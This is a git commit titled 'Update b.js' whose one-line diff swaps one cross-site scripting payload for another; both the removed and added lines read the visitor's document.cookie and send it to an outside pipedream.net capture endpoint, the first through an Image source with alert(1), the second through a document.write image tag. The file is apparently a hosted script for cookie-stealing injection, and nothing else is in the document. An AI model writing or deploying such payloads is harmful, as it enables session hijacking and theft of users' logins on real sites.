a30f6e512214dbdbcbd168a4b3ff1c552bb41466
mahn-don <75029025+mahn-don@users.noreply.github.com>
2022-10-27 16:59:20 +0700

    Update b.js

--- b.js
+++ b.js
@@ -1,1 +1,1 @@
-var i=new Image;i.src="https://eoedryv3unavlt0.m.pipedream.net?"+document.cookie;alert(1);
+document.write('<img src="https://eoedryv3unavlt0.m.pipedream.net?c='+document.cookie+'" />');
